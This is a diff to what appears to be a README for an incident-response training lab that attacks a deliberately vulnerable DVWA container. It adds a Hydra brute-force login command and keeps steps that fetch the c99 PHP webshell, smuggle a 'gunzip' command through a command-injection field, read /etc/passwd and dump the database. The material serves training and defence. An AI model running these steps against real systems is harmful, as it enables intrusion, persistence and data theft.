@@ -12,7 +12,7 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 0. docker-compose up -d
 
 ### WebGUI setup
-0. Browse to `http://<Doocker IP addr>` 
+0. Browse to `http://dvwa.hackinglab.beer:8080` 
 0. Login
     1. username: admin
     1. password: password
@@ -26,8 +26,11 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 0. Open terminal
 0. nikto -host http://dvwa.hackinglab.beer
 
+### Hydra brute force
+0. `hydra -l admin -P /usr/share/dirb/wordlists/small.txt dvwa.hackinglab.beer -s 8080 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`
+
 ### Zip, upload and unzip c99.php
-0. wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php
+0. `wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php`
 0. gzip -f c99.php
 0. Browse http://dvwa.hackinglab.beer with CHROME and login
     1. User: admin
@@ -36,14 +39,14 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 0. Select "Choose file", "c99.php.gz" then "Upload"
 0. Select "Command injection" on the right
 0. Enter "8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php" into "Enter ip address"
-0. Browse to http://dvwa.hackinglab.beer/hackable/uploads/c99.php
+0. Browse to http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php
 
 ### Host situation awareness
 0. Get current user: whoami
 0. Get ip info: ip a
 0. Get hostname: hostname
 0. Get list of users: cat /etc/passwd
-0. Get connection info: netstat -tunalp
+0. Get connection info: ss -l -n -t
 0. Get process list: ps aux
 0. Get known hosts: arp -a
 
@@ -53,16 +56,11 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 0. mysql -u root -e "use dvwa; show tables"
 0. mysqldump -u root --database dvwa
 
-### Commit Docker container
-0. Enter "exit" to detach from docker container
-0. docker commit [docker container ID] dvwa_demo_temp
-0. docker stop [docker container ID]
-0. docker run -d -p 80:80 --restart always --name dvwa_demo dvwa_demo_temp
-
-### Restart Docker container if corrupted
-0. docker restart dvwa_demo
-
 ## Incident reponse demo
+### Connecting to machine
+0. ssh 
+
+
 ### Understanding the machine
 It is important to understand the machine you are investigating
 
